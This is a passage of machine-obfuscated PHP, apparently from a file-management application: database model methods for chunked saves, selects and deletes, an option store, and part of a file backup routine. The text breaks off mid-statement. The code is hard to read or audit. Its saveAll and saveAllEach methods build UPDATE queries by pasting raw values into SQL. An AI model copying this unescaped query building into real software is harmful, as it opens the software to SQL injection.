$ªû§Ïó•)) { if (!$ªû§Ïó•[$îŸÊÓ]) { unset($ªû§Ïó•[$îŸÊÓ]); } break; } if (isset($ªû§Ïó•[$îŸÊÓ])) { array_unshift($í´íÑá, $ªû§Ïó•[$îŸÊÓ]); } if ($§´ªúÍß[319] == $³’¨‹Áô[3]) { $ªû§Ïó•[$îŸÊÓ] = call_user_func_array($òéÁŞ³Ç, $í´íÑá); } else { $ªû§Ïó•[$îŸÊÓ] = call_user_func_array(array(&$this, $òéÁŞ³Ç), $í´íÑá); } break; case $§´ªúÍß[268]: if (isset($ªû§Ïó•[$îŸÊÓ]) && $ªû§Ïó•[$îŸÊÓ]) { $ªû§Ïó•[$îŸÊÓ] = call_user_func_array(array(&$this, $³’¨‹Áô[1]), array($ªû§Ïó•[$îŸÊÓ])); } break; case $§´ªúÍß[271]: $ªû§Ïó•[$îŸÊÓ] = $ªû§Ïó•[$³’¨‹Áô[1]]; break; case $§´ªúÍß[292]: if (isset($ªû§Ïó•[$îŸÊÓ]) && !is_string($ªû§Ïó•[$îŸÊÓ])) { $ªû§Ïó•[$îŸÊÓ] = json_encode_force($ªû§Ïó•[$îŸÊÓ]); } break; case $§´ªúÍß[321]: if ($ªû§Ïó•[$îŸÊÓ] === $§´ªúÍß[33]) { unset($ªû§Ïó•[$îŸÊÓ]); } break; case $§´ªúÍß[322]: $ªû§Ïó•[$îŸÊÓ] = $³’¨‹Áô[1]; default: break; } } if ($—ÅìŠ½€ == $§´ªúÍß[353]) { $µİÎ²À = strtolower($this->db->getDbType()); if (strpos($µİÎ²À, $§´ªúÍß[9]) !== 0) { return; } $†Š®ªÑ = $this->field(!0)->fields; $”–ÑÓ±Á = $†Š®ªÑ[$§´ªúÍß[250]]; if (isset($†Š®ªÑ[$§´ªúÍß[249]])) { unset($”–ÑÓ±Á[$†Š®ªÑ[$§´ªúÍß[249]]]); } foreach ($”–ÑÓ±Á as $‹ÑËïûó => $—ÅìŠ½€) { if (!isset($ªû§Ïó•[$‹ÑËïûó])) { $ªû§Ïó•[$‹ÑËïûó] = $§´ªúÍß[33]; } } } } private function dataAfterFilter(&$š¤Ãüªç) { $ëâéŸí† =& $_SERVER[Ù×¯Ø…]; foreach ($this->dataAuto as $Ûğû¦Ù©) { $àíÀ¸Ÿº = $Ûğû¦Ù©[0]; if (!isset($š¤Ãüªç[$àíÀ¸Ÿº])) { continue; } if (!in_array($ëâéŸí†[355], explode($ëâéŸí†[47], $Ûğû¦Ù©[2]))) { continue; } switch (trim($Ûğû¦Ù©[3])) { case $ëâéŸí†[319]: case $ëâéŸí†[320]: $Å™§¨ÌŞ = isset($Ûğû¦Ù©[4]) ? (array) $Ûğû¦Ù©[4] : array(); array_unshift($Å™§¨ÌŞ, $š¤Ãüªç[$àíÀ¸Ÿº]); if (isset($Ûğû¦Ù©[4]) && $Ûğû¦Ù©[4] == $ëâéŸí†[375]) { $Å™§¨ÌŞ = array($š¤Ãüªç[$àíÀ¸Ÿº]); } if ($ëâéŸí†[319] == $Ûğû¦Ù©[3]) { $š¤Ãüªç[$àíÀ¸Ÿº] = call_user_func_array($Ûğû¦Ù©[1], $Å™§¨ÌŞ); } else { $š¤Ãüªç[$àíÀ¸Ÿº] = call_user_func_array(array(&$this, $Ûğû¦Ù©[1]), $Å™§¨ÌŞ); } break; case $ëâéŸí†[268]: if (isset($š¤Ãüªç[$àíÀ¸Ÿº]) && $š¤Ãüªç[$àíÀ¸Ÿº]) { $š¤Ãüªç[$àíÀ¸Ÿº] = call_user_func_array(array(&$this, $Ûğû¦Ù©[1]), array($š¤Ãüªç[$àíÀ¸Ÿº])); } break; case $ëâéŸí†[271]: $š¤Ãüªç[$àíÀ¸Ÿº] = $š¤Ãüªç[$Ûğû¦Ù©[1]]; break; case $ëâéŸí†[292]: $¥Ó·±ëæ = $š¤Ãüªç[$àíÀ¸Ÿº]; $š¤Ãüªç[$àíÀ¸Ÿº] = json_decode($¥Ó·±ëæ, !0); if (is_null($š¤Ãüªç[$àíÀ¸Ÿº])) { $š¤Ãüªç[$àíÀ¸Ÿº] = $¥Ó·±ëæ; } break; case $ëâéŸí†[321]: if ($š¤Ãüªç[$àíÀ¸Ÿº] === $ëâéŸí†[33]) { unset($š¤Ãüªç[$àíÀ¸Ÿº]); } break; case $ëâéŸí†[322]: $š¤Ãüªç[$àíÀ¸Ÿº] = $Ûğû¦Ù©[1]; break; default: break; } } } public function saveAll($¡µÄ…åô) { $Âé²ÌÜ¯ =& $_SERVER[Ù×¯Ø…]; $ûÆĞ’àÔ = $this->tablePrefix . $this->tableName; $…ÍòÙ°ª = self::SQL_WHERE_IN_CHUNK; $¡µÄ…åô = is_array($¡µÄ…åô) ? $¡µÄ…åô : array(); $¶§ø›Ğ± = $Âé²ÌÜ¯[376]; $ìÅš×’– = 0; $”ˆ°›ã = array(); $Ëã£¦Ö = count($¡µÄ…åô); for ($ÚÄ¾»–¼ = 0; $ÚÄ¾»–¼ < $Ëã£¦Ö; $ÚÄ¾»–¼++) { $ùÎÜ¤Å = $¡µÄ…åô[$ÚÄ¾»–¼]; if (!is_array($ùÎÜ¤Å) || count($ùÎÜ¤Å) != 4) { continue; } $Í’Âì™Ñ = "\125\120\x44\101\x54\105\40\x60{$ûÆĞ’àÔ}\x60\x20\123\x45\x54\40{$ùÎÜ¤Å[2]}\40\x3d\x20\103\101\123\x45\40{$ùÎÜ¤Å[0]}\x20\xa"; if ($ìÅš×’– == 0) { $¶§ø›Ğ± = $Í’Âì™Ñ; } $”ˆ°›ã[] = $Âé²ÌÜ¯[116] . $ùÎÜ¤Å[1] . $Âé²ÌÜ¯[116]; $ìÅš×’–++; $¶§ø›Ğ± .= "\40\x57\x48\x45\116\x20\47{$ùÎÜ¤Å[1]}\x27\40\x54\x48\105\x4e\40\47{$ùÎÜ¤Å[3]}\x27\x20\12"; if ($ìÅš×’– == $…ÍòÙ°ª || $ÚÄ¾»–¼ == $Ëã£¦Ö - 1) { $óä«È = implode($Âé²ÌÜ¯[47], $”ˆ°›ã); $¶§ø›Ğ± .= "\40\x45\x4e\104\40\x20\x57\110\105\x52\x45\40{$ùÎÜ¤Å[0]}\x20\x49\116\x20\x28{$óä«È}\x29\x20"; $this->execute($¶§ø›Ğ±); $ìÅš×’– = 0; $¶§ø›Ğ± = $Í’Âì™Ñ; $this->chunkEventCheck(count($”ˆ°›ã)); $”ˆ°›ã = array(); } } $this->chunkEventSet(); } public function saveAllEach($Ô Á·“ş) { $Ä•Éı“ =& $_SERVER[Ù×¯Ø…]; $®¢Œšó¼ = $this->tablePrefix . $this->tableName; foreach ($Ô Á·“ş as $Ç—İîÄ¨) { if (!is_array($Ç—İîÄ¨) || count($Ç—İîÄ¨) != 4) { continue; } $¡‡ó¯Ï‹ = $Ç—İîÄ¨[0] . $Ä•Éı“[377] . $Ç—İîÄ¨[1] . $Ä•Éı“[116]; $ë¥Ê’°Ë = $Ç—İîÄ¨[2] . $Ä•Éı“[377] . $Ç—İîÄ¨[3] . $Ä•Éı“[116]; $Ï€€«¥ã = "\x75\x70\x64\141\164\x65\x20{$®¢Œšó¼}\x20\x73\x65\164\x20{$ë¥Ê’°Ë}\x20\167\x68\145\x72\145\40{$¡‡ó¯Ï‹}\73"; $this->execute($Ï€€«¥ã); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¡àÌ¼äı = false, $ÃÂÚæ = false) { $this->_chunkEvent = $¡àÌ¼äı; $this->_chunkEventParam = $ÃÂÚæ; } private function chunkEventCheck($ß•´÷”¿) { if (!$this->_chunkEvent) { return; } $¢ÔÌïÛ— = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $¢ÔÌïÛ—[$_SERVER[Ù×¯Ø…][378]] = $ß•´÷”¿; Hook::trigger($this->_chunkEvent, $¢ÔÌïÛ—); } public function addAll($Üâ¾»ß, $²ç¿­÷ƒ = array(), $À×¶™î = false) { $¦œÇ×Œœ =& $_SERVER[Ù×¯Ø…]; ignore_timeout(); $ôˆ•ŠºÓ = self::SQL_WHERE_IN_CHUNK; if (empty($Üâ¾»ß)) { $this->error = think_lang($¦œÇ×Œœ[269]); return !1; } $²ç¿­÷ƒ = $this->_parseOptions($²ç¿­÷ƒ); foreach ($Üâ¾»ß as $úÌ­÷ñ– => $Òˆ³§£À) { $Üâ¾»ß[$úÌ­÷ñ–] = $this->_facade($Òˆ³§£À); $this->_beforeInsert($Üâ¾»ß[$úÌ­÷ñ–], $²ç¿­÷ƒ); } if (method_exists($this->db, $¦œÇ×Œœ[270])) { for ($ªñ”ØªÚ = 0; $ªñ”ØªÚ < count($Üâ¾»ß); $ªñ”ØªÚ += $ôˆ•ŠºÓ) { $Ş¾å±Òá = array_slice($Üâ¾»ß, $ªñ”ØªÚ, $ôˆ•ŠºÓ); if (!is_array($Ş¾å±Òá) || count($Ş¾å±Òá) == 0) { break; } $—‰ê…Ô» = $this->db->insertAll($Ş¾å±Òá, $²ç¿­÷ƒ, $À×¶™î); $this->chunkEventCheck(count($Ş¾å±Òá)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Üâ¾»ß as $úÌ­÷ñ– => $Òˆ³§£À) { $—‰ê…Ô» = $this->db->insert($Òˆ³§£À, $²ç¿­÷ƒ, $À×¶™î); } $this->commit(); } if (!1 !== $—‰ê…Ô») { $²èè¾® = $this->getLastInsID(); if ($²èè¾®) { return $²èè¾®; } } return $—‰ê…Ô»; } public function save($î€â¬ÄÍ = '', $¢à´ƒô = array()) { $ËõşÓ¢ =& $_SERVER[Ù×¯Ø…]; $‡¦îÃâú = self::SQL_WHERE_IN_CHUNK; $ìú©Ÿş = $this->optionsValue(); $­²ÈËœÔ = $this->findWhereField($ìú©Ÿş); if (!$­²ÈËœÔ) { return parent::save($î€â¬ÄÍ, $¢à´ƒô); } $Å„§ï• = 0; $„Ü©Ç“‘ = $ìú©Ÿş[$ËõşÓ¢[273]][$­²ÈËœÔ][1]; $„Ü©Ç“‘ = is_array($„Ü©Ç“‘) ? $„Ü©Ç“‘ : array(); $Ü¢°¾°© = count($„Ü©Ç“‘); for ($É¼öè«Ò = 0; $É¼öè«Ò < $Ü¢°¾°©; $É¼öè«Ò += $‡¦îÃâú) { $ï°ÜÉ„ò = array_slice($„Ü©Ç“‘, $É¼öè«Ò, $‡¦îÃâú); if (!is_array($ï°ÜÉ„ò) || count($ï°ÜÉ„ò) == 0) { break; } $ìú©Ÿş[$ËõşÓ¢[273]][$­²ÈËœÔ][1] = $ï°ÜÉ„ò; $this->optionsValue($ìú©Ÿş); $Å„§ï• += parent::save($î€â¬ÄÍ, $¢à´ƒô); $this->chunkEventCheck(count($ï°ÜÉ„ò)); } $this->chunkEventSet(); return $Å„§ï•; } public function add($†¼ÏÓ´ = '', $®ÑƒêÈÄ = array(), $çÄ¶Ì†ö = false) { if ($this->addTaskStatus && is_array($†¼ÏÓ´)) { $this->addTaskData[] = $†¼ÏÓ´; return; } return parent::add($†¼ÏÓ´, $®ÑƒêÈÄ, $çÄ¶Ì†ö); } public function parseWhereLike($²ŸªÊœô, $ñÌ´¾ˆ‘ = '', $ü°ÖÎ¼ = false, &$ ¹Â°¦‡ = false) { $´·ŞîîŞ =& $_SERVER[Ù×¯Ø…]; $ôÊ£Üë = $GLOBALS[$´·ŞîîŞ[6]][$´·ŞîîŞ[379]]; if (!$ôÊ£Üë[$´·ŞîîŞ[380]]) { return $²ŸªÊœô; } if (!is_array($²ŸªÊœô)) { return $²ŸªÊœô; } $ÚºÛêÃ = array(); $âÃ»ãÔ– = 0; foreach ($²ŸªÊœô as $Ùìîè‡Û => $¹êÁíæÇ) { if (is_array($¹êÁíæÇ) && count($¹êÁíæÇ) == 2 && $¹êÁíæÇ[0] == $´·ŞîîŞ[381] && is_string($¹êÁíæÇ[1]) && substr($¹êÁíæÇ[1], 0, 1) == $´·ŞîîŞ[382] && substr($¹êÁíæÇ[1], strlen($¹êÁíæÇ[1]) - 1, 1) == $´·ŞîîŞ[382]) { $ ¹Â°¦‡ = !0; $ùÂûòÍÌ = is_string($Ùìîè‡Û) ? $Ùìîè‡Û : $ñÌ´¾ˆ‘; $ÌÁ·–µé = substr($¹êÁíæÇ[1], 1, strlen($¹êÁíæÇ[1]) - 2); $ÌÁ·–µé = $this->db->escapeString($ÌÁ·–µé); if (!strpos($ùÂûòÍÌ, $´·ŞîîŞ[95])) { $ùÂûòÍÌ = $´·ŞîîŞ[383] . $ùÂûòÍÌ . $´·ŞîîŞ[383]; } $Û‰Çğì = $´·ŞîîŞ[182] . $ÌÁ·–µé . $´·ŞîîŞ[182]; if ($ôÊ£Üë[$´·ŞîîŞ[384]]) { $Û‰Çğì = $´·ŞîîŞ[385] . $ÌÁ·–µé . $´·ŞîîŞ[386]; if ($ôÊ£Üë[$´·ŞîîŞ[387]]) { $Û‰Çğì = $´·ŞîîŞ[386] . $ÌÁ·–µé . $´·ŞîîŞ[385]; } } $ÚºÛêÃ[$âÃ»ãÔ–] = $´·ŞîîŞ[388] . $ùÂûòÍÌ . $´·ŞîîŞ[389] . $Û‰Çğì . $´·ŞîîŞ[390]; $âÃ»ãÔ–++; continue; } if (is_array($¹êÁíæÇ)) { $ñÌ´¾ˆ‘ = is_string($Ùìîè‡Û) ? $Ùìîè‡Û : $ñÌ´¾ˆ‘; $¹êÁíæÇ = $this->parseWhereLike($¹êÁíæÇ, $ñÌ´¾ˆ‘, !0, $ ¹Â°¦‡); } if (is_numeric($Ùìîè‡Û)) { $ÚºÛêÃ[$âÃ»ãÔ–] = $¹êÁíæÇ; $âÃ»ãÔ–++; } else { $ÚºÛêÃ[$Ùìîè‡Û] = $¹êÁíæÇ; } } if ($ ¹Â°¦‡ && !$ü°ÖÎ¼) { } return $ÚºÛêÃ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Ì÷ìÀ…© = array()) { $¢ä§ä– =& $_SERVER[Ù×¯Ø…]; $œª’¾É  = self::SQL_WHERE_IN_CHUNK; $ê›á±ĞÂ = $this->optionsValue(); $÷×ú˜»ş = $this->findWhereField($ê›á±ĞÂ); if (!$÷×ú˜»ş || isset($ê›á±ĞÂ[$¢ä§ä–[290]]) || isset($ê›á±ĞÂ[$¢ä§ä–[351]])) { return parent::select($Ì÷ìÀ…©); } $»ƒ‡º° = $ê›á±ĞÂ[$¢ä§ä–[273]][$÷×ú˜»ş][1]; $»ƒ‡º° = is_array($»ƒ‡º°) ? $»ƒ‡º° : array(); $Ó¿ğìøå = null; for ($ØÙæ¡¹â = 0; $ØÙæ¡¹â < count($»ƒ‡º°); $ØÙæ¡¹â += $œª’¾É ) { $×‘Ë»· = array_slice($»ƒ‡º°, $ØÙæ¡¹â, $œª’¾É ); if (!is_array($×‘Ë»·) || count($×‘Ë»·) == 0) { break; } $ê›á±ĞÂ[$¢ä§ä–[273]][$÷×ú˜»ş][1] = $×‘Ë»·; $this->optionsValue($ê›á±ĞÂ); $î…û‘ïˆ = parent::select($Ì÷ìÀ…©); if (!$î…û‘ïˆ) { continue; } $Ó¿ğìøå = is_array($Ó¿ğìøå) ? $Ó¿ğìøå : array(); $Ó¿ğìøå = array_merge($Ó¿ğìøå, $î…û‘ïˆ); } return $Ó¿ğìøå; } public function delete($ÑŸ¦á˜” = array()) { $¥ı¹«ØĞ =& $_SERVER[Ù×¯Ø…]; $ ‰¨†«× = self::SQL_WHERE_IN_CHUNK; $Ã°¥é® = $this->optionsValue(); $£í¤»êã = $this->findWhereField($Ã°¥é®); if (!$£í¤»êã) { return parent::delete($ÑŸ¦á˜”); } $÷Ğ”³ÎÛ = 0; $ËÚƒË…‚ = $Ã°¥é®[$¥ı¹«ØĞ[273]][$£í¤»êã][1]; $ËÚƒË…‚ = is_array($ËÚƒË…‚) ? $ËÚƒË…‚ : array(); for ($¢²‘Ñé¿ = 0; $¢²‘Ñé¿ < count($ËÚƒË…‚); $¢²‘Ñé¿ += $ ‰¨†«×) { $Ì¤íÑš = array_slice($ËÚƒË…‚, $¢²‘Ñé¿, $ ‰¨†«×); if (!is_array($Ì¤íÑš) || count($Ì¤íÑš) == 0) { break; } $Ã°¥é®[$¥ı¹«ØĞ[273]][$£í¤»êã][1] = $Ì¤íÑš; $this->optionsValue($Ã°¥é®); $÷Ğ”³ÎÛ += parent::delete($ÑŸ¦á˜”); } return $÷Ğ”³ÎÛ; } private function findWhereField($¤”µ›üº) { $ú·Ò €Ã =& $_SERVER[Ù×¯Ø…]; $À“®±›§ = self::SQL_WHERE_IN_CHUNK; if (!is_array($¤”µ›üº) || !is_array($¤”µ›üº[$ú·Ò €Ã[273]])) { return !1; } foreach ($¤”µ›üº[$ú·Ò €Ã[273]] as $öÔ¤‹™ => $ËáÖ—î) { if (is_array($ËáÖ—î) && isset($ËáÖ—î[0]) && is_string($ËáÖ—î[0]) && strtolower($ËáÖ—î[0]) == $ú·Ò €Ã[7] && is_array($ËáÖ—î[1]) && count($ËáÖ—î[1]) > $À“®±›§) { ignore_timeout(); return $öÔ¤‹™; } } return !1; } public function setMasterDB($‡ëòÂÔú = true) { think_config($_SERVER[Ù×¯Ø…][391], $‡ëòÂÔú); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\x74\145\x6d\117\160\164\151\x6f\x6e"; public $field = array(); public function listData($¾ê’‰†Í = false, $Ê³¨âØ¾ = "\155\x6f\144\151\146\x79\124\x69\x6d\x65", $·şØËü = false) { $Ò£“éÚ = Model($this->modelType)->get(!1, $this->optionType, !0); $Æšô¯ÂÔ = array_values($Ò£“éÚ); if ($Æšô¯ÂÔ && $Æšô¯ÂÔ[0] && !is_array($Æšô¯ÂÔ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Ò£“éÚ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Ò£“éÚ) { return $¾ê’‰†Í ? null : array(); } if (!$¾ê’‰†Í) { $Ò£“éÚ = array_filter(array_values($Ò£“éÚ)); return array_sort_by($Ò£“éÚ, $Ê³¨âØ¾, $·şØËü); } return $Ò£“éÚ[$_SERVER[Ù×¯Ø…][392] . $¾ê’‰†Í]; } public function insert($ë¨¥—Ü­) { $¢ùÅÓš =& $_SERVER[Ù×¯Ø…]; $ë¨¥—Ü­ = array_field_key($ë¨¥—Ü­, $this->field); $²şŠşë¤ = Model($this->modelType)->get($¢ùÅÓš[393], $this->optionType . $¢ùÅÓš[394]); $²şŠşë¤ = $²şŠşë¤ ? $²şŠşë¤ : 0; $ë¨¥—Ü­[$¢ùÅÓš[395]] = ++$²şŠşë¤; $ë¨¥—Ü­[$¢ùÅÓš[194]] = time(); $ë¨¥—Ü­[$¢ùÅÓš[84]] = time(); Model($this->modelType)->set($¢ùÅÓš[393], $²şŠşë¤, $this->optionType . $¢ùÅÓš[394]); Model($this->modelType)->set($¢ùÅÓš[392] . $²şŠşë¤, $ë¨¥—Ü­, $this->optionType); return $²şŠşë¤; } public function update($›êïá³‰, $Äâæ¬é­) { $ë«şÅæÜ =& $_SERVER[Ù×¯Ø…]; $Äâæ¬é­ = array_field_key($Äâæ¬é­, $this->field); $í«˜ó˜ı = $this->listData($›êïá³‰); if (!$í«˜ó˜ı || !$›êïá³‰) { return !1; } $Äâæ¬é­ = array_merge($í«˜ó˜ı, $Äâæ¬é­); $Äâæ¬é­[$ë«şÅæÜ[84]] = time(); return Model($this->modelType)->set($ë«şÅæÜ[392] . $›êïá³‰, $Äâæ¬é­, $this->optionType); } public function remove($ˆÂü¤¹) { if (!$ˆÂü¤¹) { return !1; } return Model($this->modelType)->remove($_SERVER[Ù×¯Ø…][392] . $ˆÂü¤¹, $this->optionType); } public function clear() { $Íä¦õ =& $_SERVER[Ù×¯Ø…]; Model($this->modelType)->remove($Íä¦õ[393], $this->optionType . $Íä¦õ[394]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Š–ìÀÅù, $ŸÜ„­„Î) { if (!$ŸÜ„­„Î) { return !1; } $ÓÛ„ê¨¬ = $this->listData(); $ÓÛ„ê¨¬ = array_to_keyvalue($ÓÛ„ê¨¬, $Š–ìÀÅù); return isset($ÓÛ„ê¨¬[$ŸÜ„­„Î]) ? $ÓÛ„ê¨¬[$ŸÜ„­„Î] : !1; } public function findByName($Ÿù™Áƒş) { return $this->findByKey($_SERVER[Ù×¯Ø…][28], $Ÿù™Áƒş); } protected function resetData($ºÁÙ“Çş) { $†–ë«Í =& $_SERVER[Ù×¯Ø…]; $ºÁÙ“Çş = is_array($ºÁÙ“Çş) ? $ºÁÙ“Çş : array(); $£³§İí› = array(); for ($œ³ÉÓ¶ = 0; $œ³ÉÓ¶ < count($ºÁÙ“Çş); $œ³ÉÓ¶++) { $£³§İí›[$†–ë«Í[392] . $ºÁÙ“Çş[$œ³ÉÓ¶][$†–ë«Í[395]]] = $ºÁÙ“Çş[$œ³ÉÓ¶]; } return Model($this->modelType)->set($£³§İí›, !1, $this->optionType); } private function getAutoName($ÆöâÉ¤¬) { $’·çğ¢¢ = array_to_keyvalue($this->listData(), $_SERVER[Ù×¯Ø…][28]); if (!$’·çğ¢¢ || !isset($’·çğ¢¢[$ÆöâÉ¤¬])) { return $ÆöâÉ¤¬; } for ($‚‘¥œº– = 1; $‚‘¥œº– < count($’·çğ¢¢); $‚‘¥œº–++) { $±å‰Ê‚ = $ÆöâÉ¤¬ . "\x28{$‚‘¥œº–}\x29"; if (!isset($’·çğ¢¢[$±å‰Ê‚])) { return $±å‰Ê‚; } } return $±å‰Ê‚; } } goto c‘ëÃ»´æä; DƒÂ—µø™«: class BackupFile { public function __construct() { } public function index() { $ÉÔÎÉ = Backup::get(); $¾ÛŒ×¢ = $ÉÔÎÉ[$_SERVER[Ù×¯Ø…][291]][$_SERVER[Ù×¯Ø…][193]][$_SERVER[Ù×¯Ø…][470]]; $Æ«ÖÈ³€ = array($_SERVER[Ù×¯Ø…][471] => array($_SERVER[Ù×¯Ø…][813], $¾ÛŒ×¢), $_SERVER[Ù×¯Ø…][814] => array($_SERVER[Ù×¯Ø…][329], $ÉÔÎÉ[$_SERVER[Ù×¯Ø…][751]])); $½™ü¨û = (int) Model($_SERVER[Ù×¯Ø…][786])->where($Æ«ÖÈ³€)->count($_SERVER[Ù×¯Ø…][470]); $’÷£¡ÆÏ = (int) Model($_SERVER[Ù×¯Ø…][786])->where($Æ«ÖÈ³€)->sum($_SERVER[Ù×¯Ø…][78]); $ğüÀê¹¿ = new TaskFileTransfer($_SERVER[Ù×¯Ø…][815], $_SERVER[Ù×¯Ø…][781], $½™ü¨û, LNG($_SERVER[Ù×¯Ø…][782]) . $_SERVER[Ù×¯Ø…][783] . LNG($_SERVER[Ù×¯Ø…][816])); $ğüÀê¹¿->task[$_SERVER[Ù×¯Ø…][762]] = $’÷£¡ÆÏ; $ÑÆ°ÙƒÙ = array($_SERVER[Ù×¯Ø…][817] => $½™ü¨û, $_SERVER[Ù×¯Ø…][818] => $’÷£¡ÆÏ, $_SERVER[Ù×¯Ø…][819] => time()); Backup::set($ÑÆ°ÙƒÙ); $üÚ¢¥¥» = !0; $ÈÒ²“¥È = $this->storeIds(); $µ°â ­¿ = 1; $ˆÏâ–§ = 1000; $×¿ìë÷ú = $õ¥Œ“«í = 0; $óÒÙÁ±± = array(); $çˆ•Ì¡ = $çôø—¸‚ = 0; do { $ÕùÙ—˜¤ = $_SERVER[Ù×¯Ø…][820]; $®ˆ’»İÔ = Model($_SERVER[Ù×¯Ø…][786])->where($Æ«ÖÈ³€)->field($ÕùÙ—˜¤)->order($_SERVER[Ù×¯Ø…][821])->selectPage($ˆÏâ–§, $µ°â ­¿); $ŠŠàœµ— = !empty($®ˆ’»İÔ[$_SERVER[Ù×¯Ø…][367]]) ? $®ˆ’»İÔ[$_SERVER[Ù×¯Ø…][367]] : array(); foreach ($ŠŠàœµ— as $î¢®ù«) { if (!$this->_fileExist($î¢®ù«, $óÒÙÁ±±, $ÈÒ²“¥È)) { $½™ü¨û -= 1; $’÷£¡ÆÏ -= (int) $î¢®ù«[$_SERVER[Ù×¯Ø…][78]]; write_log("\146\x69\154\145\40\x6e\157\164\x20\145\x78\x69\163\x74\x2e\146\151\154\145\x49\104\x3a{$î¢®ù«[$_SERVER[Ù×¯Ø…][470]]}\54\40\160\141\164\150\x3a{$î¢®ù«[$_SERVER[Ù×¯Ø…][76]]}", $_SERVER[Ù×¯Ø…][822]); continue; } $ƒÛ½ŸŸ = $î¢®ù«[$_SERVER[Ù×¯Ø…][76]]; $Íç»ÊÄ = "\x7b\151\x6f\72{$ÉÔÎÉ[$_SERVER[Ù×¯Ø…][751]]}\x7d" . substr($ƒÛ½ŸŸ, strlen("\x7b\x69\157\72{$î¢®ù«[$_SERVER[Ù×¯Ø…][823]]}\x7d")); if (IO::exist($Íç»ÊÄ)) { $ğüÀê¹¿->updateFileEnd($î¢®ù«[$_SERVER[Ù×¯Ø…][28]], $î¢®ù«[$_SERVER[Ù×¯Ø…][78]]); } else { $Íç»ÊÄ = get_path_father($Íç»ÊÄ); IO::mkdir($Íç»ÊÄ); if (!IO::copy($ƒÛ½ŸŸ, $Íç»ÊÄ, $_SERVER[Ù×¯Ø…][824])) { write_log($_SERVER[Ù×¯Ø…][825] . $ƒÛ½ŸŸ . $_SERVER[Ù×¯Ø…][808] . $Íç»ÊÄ . $_SERVER[Ù×¯Ø…][539], $_SERVER[Ù×¯Ø…][781]); $üÚ¢¥¥» = !1; break; } } $¾ÛŒ×¢ = $î¢®ù«[$_SERVER[Ù×¯Ø…][470]]; $õ¥Œ“«í += 1; $×¿ìë÷ú += $î¢®ù«[$_SERVER[Ù×¯Ø…][78]]; $çôø—¸‚ += 1; $çˆ•Ì¡ += $î¢®ù«[$_SERVER[Ù×¯Ø…][78]]; if ($×¿ìë÷ú >= 1024 * 1024 * 100) { $ÑÆ°ÙƒÙ = array($_SERVER[Ù×¯Ø…][826] => $¾ÛŒ×¢, $_SERVER[Ù×¯Ø…][827] => $çôø—¸‚, $_SERVER[Ù×¯Ø…][828] => $çˆ•Ì¡); Backup::set($ÑÆ°ÙƒÙ); $×¿ìë÷ú = $õ¥Œ“«í = 0; } } $ß÷›´Ÿ× = count($ŠŠàœµ—); $µ°â ­¿++; } while ($ß÷›´Ÿ× == $ˆÏâ–§); $ğüÀê¹¿->end(); $ÑÆ°ÙƒÙ = array($_SERVER[Ù×¯Ø…][829] => 1, $_SERVER[Ù×¯Ø…][499] => time(), $_SERVER[Ù×¯Ø…][774] => 1, $_SERVER[Ù×¯Ø…][826] => $¾ÛŒ×¢, $_SERVER[Ù×¯Ø…][818] => $’÷£¡ÆÏ, $_SERVER[Ù×¯Ø…][817] => $½™ü¨û, $_SERVER[Ù×¯Ø…][830] => time()); if ($õ¥Œ“«í) { $ÑÆ°ÙƒÙ[$_SERVER[Ù×¯Ø…][827]] = $çôø—¸‚; $ÑÆ°ÙƒÙ[$_SERVER[Ù×¯Ø…][828]] = $çˆ•Ì¡; } Backup::set($ÑÆ°ÙƒÙ); $this->_fileFilter($óÒÙÁ±±); return !0; } private function _fileExist($ï¼«çÅµ, &$˜‡õˆ¶¨, $ƒöà‰¶§) { $‚ì¹¢şú =& $_SERVER[Ù×¯Ø…]; $œ»‰¹‘õ = $ï¼«çÅµ[$‚ì¹¢şú[76]]; if (in_array($ï¼«çÅµ[$‚ì¹¢şú[470]], $˜‡õˆ¶¨)) { return !1; } if (!in_array($ï¼«çÅµ[$‚ì¹¢şú[823]], $ƒöà‰¶§)) { return !1; } if (IO::exist($œ»‰¹‘õ)) { return !0; } $¡ŸÎĞ‹ = get_path_father($œ»‰¹‘õ); if (IO::exist($¡ŸÎĞ‹)) { $˜‡õˆ¶¨[] = $ï¼«çÅµ[$‚ì¹¢şú[470]]; return !1; } $½¡å¡Äò = array($‚ì¹¢şú[823] => $ï¼«çÅµ[$‚ì¹¢şú[823]], $‚ì¹¢şú[76] => array($‚ì¹¢şú[381], "{$¡ŸÎĞ‹}\x25")); $ø÷‰ó“ = Model($‚ì¹¢şú[786])->where($½¡å¡Äò)->field($‚ì¹¢şú[471])->select(); $˜‡õˆ¶¨ = array_merge($˜‡õˆ¶¨, array_to_keyvalue($ø÷‰ó“, $‚ì¹¢şú[33], $‚ì¹¢şú[470])); return !1; } private function _fileFilter($Âš‹ù¤õ) { $Ôê²ÔÖõ =& $_SERVER[Ù×¯Ø…]; if (empty($Âš‹ù¤õ)) { return; } $×éÖ®Ñ¾ = array($Ôê²ÔÖõ[470] => array($Ôê²ÔÖõ[7], array_unique($Âš‹ù¤õ))); $õ„ÅÑÎ­ = Model($Ôê²ÔÖõ[831])->where($×éÖ®Ñ¾)->field($Ôê²ÔÖõ[406])->select(); foreach ($õ„ÅÑÎ­ as $æøÍåûÂ) { Model($Ôê²ÔÖõ[831])->remove($æøÍåûÂ[$Ôê²ÔÖõ[406]], !1); } } private function storeIds() { $Å¾ÚÚ« =& $_SERVER[Ù×¯Ø…]; $ˆ…ÃÅà = Model($Å¾ÚÚ«[766])->listData(); $¨†á„ğı = array(); $ˆÑæŞ¶ã = $GLOBALS[$Å¾ÚÚ«[6]][$Å¾ÚÚ«[88]][$Å¾ÚÚ«[832]]; foreach ($ˆ…ÃÅà as $›§¹˜Òá) { $ƒ³·¦ø = strtolower($›§¹˜Òá[$Å¾ÚÚ«[94]]); if (!isset($ˆÑæŞ¶ã[$ƒ³·¦ø])) { continue; } $ÅÖ÷ê¨í = $Å¾ÚÚ«[72] . 